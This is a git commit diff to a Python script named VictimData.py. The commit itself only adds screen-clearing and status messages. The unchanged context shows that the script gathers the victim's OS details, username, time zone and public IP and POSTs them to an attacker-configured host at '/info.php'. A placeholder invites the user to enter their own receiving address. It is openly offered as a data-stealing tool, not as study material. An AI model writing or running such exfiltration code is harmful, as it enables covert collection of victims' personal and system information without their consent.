cccaa6069efbc5ec33f044f421ad304b7c8f795e
Ali Garivani <72452146+aligarivani@users.noreply.github.com>
2022-12-06 06:41:59 +0330

    create show work part

--- VictimData.py
+++ VictimData.py
@@ -3,13 +3,19 @@ import platform
 import getpass
 import time
 import requests
+import os
 
 # created by Ali Garivani
-
+os.system('cls')
+print('now started ... ')
+time.sleep(1)
 os_name = platform.uname()[0]
 os_version = platform.uname()[2]
 user_name = getpass.getuser()
 time_zone = time.tzname[0]
+os.system('cls')
+print('config ip ...')
+time.sleep(1)
 ip = requests.get('https://api.ipify.org/').text
 
 victim_data = {
@@ -18,3 +24,6 @@ victim_data = {
 # change here :
 address = ' /<>/<>/<>/ Enter Your Address Host For Send Victim Data /<>/<>/<>/ '
 http = requests.post(f'{address}/info.php', data=victim_data)
+os.system('cls')
+
+print('well done :) ')
